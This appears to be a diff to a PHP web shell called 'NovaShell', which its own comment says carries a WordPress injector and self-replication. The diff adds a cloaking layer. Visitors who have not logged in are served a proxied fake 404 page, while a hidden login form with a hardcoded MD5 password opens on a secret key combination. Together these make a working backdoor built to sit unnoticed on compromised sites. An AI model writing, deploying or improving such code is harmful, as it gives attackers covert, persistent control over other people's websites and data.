@@ -1,4 +1,77 @@
 <?php
+session_start();
+
+$real_password_md5 = "d61eac1c9cfc3f58ba84f29a33c52289"; // md5("admin123")
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Handle login
+if (isset($_POST['authpass'])) {
+    if (md5($_POST['authpass']) === $real_password_md5) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    }
+}
+
+// Belum login
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+    $host = $_SERVER['HTTP_HOST'];
+    $self_404 = $scheme . $host . "/fiIter.php";
+
+    $ch = curl_init($self_404);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HEADER => true,
+        CURLOPT_NOBODY => false,
+        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0'
+    ]);
+    $resp = curl_exec($ch);
+    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    $header = substr($resp, 0, $headerSize);
+    $body = substr($resp, $headerSize);
+
+    foreach (explode("\r\n", $header) as $line) {
+        if (stripos($line, 'Content-Length') === 0) continue;
+        if (stripos($line, 'Transfer-Encoding') === 0) continue;
+        header($line);
+    }
+    header("HTTP/1.1 $status");
+    echo $body;
+
+    // Hidden login form (Ctrl+Shift+L)
+    echo '
+    <div id="hidden-login" style="display:none;position:fixed;top:10px;right:10px;opacity:0.2;z-index:99999;" onmouseover="this.style.opacity=1;" onmouseout="this.style.opacity=0.2;">
+        <form method="post" style="background:rgba(0,0,0,0.7);padding:10px;border-radius:8px;">
+            <input type="password" name="authpass" placeholder="Password" style="background:transparent;border:1px solid #555;color:#fff;padding:5px;" />
+            <button type="submit" style="background:#222;color:#fff;border:1px solid #444;padding:5px;">Login</button>
+        </form>
+    </div>
+    <script>
+    document.addEventListener("keydown", function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "l") {
+            var form = document.getElementById("hidden-login");
+            if (form) {
+                form.style.display = (form.style.display === "none") ? "block" : "none";
+            }
+        }
+    });
+    </script>
+    ';
+    exit;
+}
+?>﻿
+<?php
 // 🛸 NovaShell — Clean PHP Shell with WP injector and replication
 error_reporting(0);
 
@@ -186,4 +259,5 @@ echo "<form method='post' enctype='multipart/form-data'>
 echo explorer($cwd);
 echo "</body></html>";
 ?>
+
 
